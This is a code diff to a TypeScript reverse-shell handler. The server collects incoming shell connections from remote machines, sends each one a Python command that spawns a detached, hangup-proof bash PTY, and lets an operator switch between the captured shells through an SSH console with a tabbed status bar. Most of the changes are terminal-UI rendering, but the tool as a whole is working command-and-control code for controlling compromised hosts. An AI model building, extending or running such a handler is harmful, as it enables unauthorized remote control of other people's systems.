@@ -12,12 +12,60 @@ interface SSHConnectionState {
     stream: any;
     selectedConnection: net.Socket | null;
     commandMode: boolean;
+    rows?: number;
+    cols?: number;
 }
 
 // 存储所有活动的反向shell连接
 const activeConnections = new Map<string, net.Socket>();
 // 存储所有活动的SSH连接
 const activeSSHConnections = new Map<Connection, SSHConnectionState>();
+
+// Define render functions at top level
+const visibleLength = (str: string): number => {
+    return str.replace(/\x1b\[[0-9;]*m/g, '').length;
+};
+
+const renderBottomBar = (state: SSHConnectionState, stream: any) => {
+    if (!state.rows || !state.cols || !stream) return;
+    const status = state.selectedConnection
+        ? `[Connected to: ${state.selectedConnection.remoteAddress}:${state.selectedConnection.remotePort}]`
+        : '[Command Mode]';
+
+    // Build tab string with bold for active
+    let tabContent = '';
+    let index = 1;
+    activeConnections.forEach((socket, id) => {
+        const isActive = socket === state.selectedConnection;
+        tabContent += (isActive ? '\x1b[1m' : '') + ` ${index}:${id} ` + (isActive ? '\x1b[22m' : '');
+        index++;
+    });
+
+    // Truncate tabs if too long
+    const statusVisLength = visibleLength(status);
+    const minStatusSpace = statusVisLength + 2;
+    const availableForTabs = state.cols - minStatusSpace;
+    let tabVisLength = visibleLength(tabContent);
+    if (tabVisLength > availableForTabs) {
+        // Truncate approximately; for simplicity, slice string and adjust
+        tabContent = tabContent.slice(0, Math.floor(tabContent.length * (availableForTabs - 3) / tabVisLength)) + '...';
+        tabVisLength = visibleLength(tabContent);
+    }
+
+    // Calculate visible padding to right-align status: total visible space between tabs and status
+    const paddingVisLength = state.cols - tabVisLength - statusVisLength;
+    const padding = ' '.repeat(paddingVisLength);
+
+    // Full line: set blue bg, write tabs, padding, status, reset
+    const fullLine = '\x1b[44;37m' + tabContent + padding + status + '\x1b[0m';
+
+    // Since padding is visible spaces, and all in blue, it should fill
+    stream.write('\x1b[s');
+    stream.write(`\x1b[${state.rows};0H`);
+    stream.write('\x1b[2K');
+    stream.write(fullLine);
+    stream.write('\x1b[u');
+};
 
 // 反向shell服务器
 const reverseShellServer = net.createServer();
@@ -28,15 +76,26 @@ reverseShellServer.on('connection', (socket) => {
     activeConnections.set(connectionId, socket);
 
     // 发送创建PTY的命令，设置初始终端大小
-    const ptyCommand = 'python3 -c "import pty, os, termios; pty.spawn(\'/bin/bash\'); os.system(\'stty rows 24 cols 80\')"';
+    const ptyCommand = `python3 -c "
+import pty, os;
+pid = os.fork();
+if pid == 0:
+  os.setsid();
+  pty.spawn(['/bin/bash', '-c', 'stty rows 24 cols 80; trap "" HUP; exec /bin/bash']);
+else:
+  os.wait()
+"`;
     socket.write(ptyCommand + '\n');
 
     // Handle incoming data from the client
     socket.on('data', (data) => {
         // 将数据转发给所有选中的SSH连接
         activeSSHConnections.forEach((sshConn) => {
-            if (sshConn.selectedConnection === socket) {
-                sshConn.stream?.write(data);
+            if (sshConn.selectedConnection === socket && sshConn.stream) {
+                sshConn.stream.write(data);
+                if (data.toString().includes('\x1b[2J')) {
+                    renderBottomBar(sshConn, sshConn.stream);
+                }
             }
         });
     });
@@ -88,7 +147,7 @@ const sshServer = new Server({
     console.log(`[+] New admin connection from ${clientInfo}`);
 
     // 初始化SSH连接状态
-    const state: SSHConnectionState = { stream: null, selectedConnection: null, commandMode: false };
+    const state: SSHConnectionState = { stream: null, selectedConnection: null, commandMode: false, rows: undefined, cols: undefined };
     activeSSHConnections.set(client, state);
 
     client.on('authentication', (ctx) => {
@@ -117,79 +176,33 @@ const sshServer = new Server({
 
             // 先处理PTY请求
             session.on('pty', (accept, reject, info) => {
+                state.rows = info.rows;
+                state.cols = info.cols;
                 accept();
             });
 
             // 处理窗口大小变化
             session.on('window-change', (accept, reject, info) => {
                 accept?.();
-                // 将新的窗口大小发送给被控端，为状态栏预留一行
-                const selectedConnection = activeSSHConnections.get(client)?.selectedConnection;
-                if (selectedConnection) {
-                    selectedConnection.write(`stty rows ${info.rows - 1} cols ${info.cols}\n`);
+                state.rows = info.rows;
+                state.cols = info.cols;
+                if (state.selectedConnection) {
+                    state.selectedConnection.write(`stty rows ${info.rows - 1} cols ${info.cols}\n`);
+                    state.stream?.write(`\x1b[1;${info.rows - 1}r`);
+                } else {
+                    state.stream?.write('\x1b[r');
                 }
+                renderBottomBar(state, state.stream);
             });
 
             session.on('shell', (accept, reject) => {
                 const stream = accept();
-                const sshConn = activeSSHConnections.get(client);
-                if (sshConn) {
-                    sshConn.stream = stream;
+                state.stream = stream;
+                if (!state.rows) {
+                    state.rows = 24;
+                    state.cols = 80;
                 }
                 console.log('[*] Admin shell session started');
-
-                // 渲染标签页
-                const renderTabs = () => {
-                    // 保存当前光标位置
-                    stream.write('\x1b[s');
-                    // 移动光标到状态栏上方
-                    stream.write('\x1b[23;0H');
-                    // 清除当前行
-                    stream.write('\x1b[2K');
-                    // 设置标签页样式
-                    stream.write('\x1b[1;34m'); // 蓝色加粗
-
-                    let tabLine = '';
-                    let index = 1;
-                    activeConnections.forEach((socket, id) => {
-                        const isActive = socket === state.selectedConnection;
-                        // 设置标签页背景色
-                        stream.write(isActive ? '\x1b[44;37m' : '\x1b[40;37m');
-                        // 添加标签页
-                        tabLine += ` ${index}:${id} `;
-                        index++;
-                    });
-
-                    // 填充剩余空间
-                    const padding = ' '.repeat(80 - tabLine.length);
-                    stream.write(tabLine + padding);
-
-                    // 重置颜色
-                    stream.write('\x1b[0m');
-                    // 恢复光标位置
-                    stream.write('\x1b[u');
-                };
-
-                // 更新状态栏
-                const updateStatusBar = () => {
-                    const status = state.selectedConnection
-                        ? `[Connected to: ${state.selectedConnection.remoteAddress}:${state.selectedConnection.remotePort}]`
-                        : '[Command Mode]';
-                    // 保存当前光标位置
-                    stream.write('\x1b[s');
-                    // 移动光标到状态栏位置
-                    stream.write('\x1b[24;0H');
-                    // 清除当前行
-                    stream.write('\x1b[2K');
-                    // 设置背景色和前景色
-                    stream.write('\x1b[44;37m');
-                    // 写入状态信息
-                    stream.write(status.padEnd(80));
-                    // 重置颜色
-                    stream.write('\x1b[0m');
-                    // 恢复光标位置
-                    stream.write('\x1b[u');
-                };
 
                 // 切换到命令模式
                 const switchToCommandMode = () => {
@@ -197,8 +210,8 @@ const sshServer = new Server({
                     state.selectedConnection = null;
                     state.commandMode = true;
                     stream.write('\r\nCommand mode - Press number to switch tab, q to quit\r\n');
-                    renderTabs();
-                    updateStatusBar();
+                    stream.write('\x1b[r'); // Reset scroll region to full screen
+                    renderBottomBar(state, stream);
                 };
 
                 // 通过数字选择连接
@@ -208,8 +221,11 @@ const sshServer = new Server({
                         const [id, socket] = connections[num - 1];
                         state.selectedConnection = socket;
                         stream.write(`\r\nSelected connection: ${id}\r\n`);
-                        renderTabs();
-                        updateStatusBar();
+                        if (state.rows && state.cols) {
+                            socket.write(`stty rows ${state.rows - 1} cols ${state.cols}\n`);
+                            stream.write(`\x1b[1;${state.rows - 1}r`); // Set scroll region to protect bottom line
+                        }
+                        renderBottomBar(state, stream);
                     } else {
                         stream.write('\r\nInvalid connection number\r\n');
                     }
@@ -218,17 +234,22 @@ const sshServer = new Server({
                 // 清屏并设置初始状态
                 stream.write('\x1b[2J\x1b[H');
                 stream.write('Command mode - Press number to switch tab, q to quit\r\n');
-                renderTabs();
-                updateStatusBar();
+                stream.write('\x1b[r'); // Initial full scroll region for command mode
+                renderBottomBar(state, stream);
 
                 stream.on('data', (data) => {
                     const input = data.toString();
-                    if (data[0] === 2) {
+                    if (data[0] === 2) { // Ctrl+B
                         if (!state.commandMode) {
                             switchToCommandMode();
                             return;
                         } else {
                             state.commandMode = false;
+                            if (state.selectedConnection && state.rows) {
+                                stream.write(`\x1b[1;${state.rows - 1}r`);
+                            }
+                            renderBottomBar(state, stream);
+                            return;
                         }
                     }
                     if (state.selectedConnection) {
@@ -246,11 +267,8 @@ const sshServer = new Server({
 
                 // 处理会话结束
                 stream.on('close', () => {
-                    const sshConn = activeSSHConnections.get(client);
-                    if (sshConn) {
-                        sshConn.stream = null;
-                        sshConn.selectedConnection = null;
-                    }
+                    state.stream = null;
+                    state.selectedConnection = null;
                     console.log('[-] Admin shell session closed');
                 });
             });
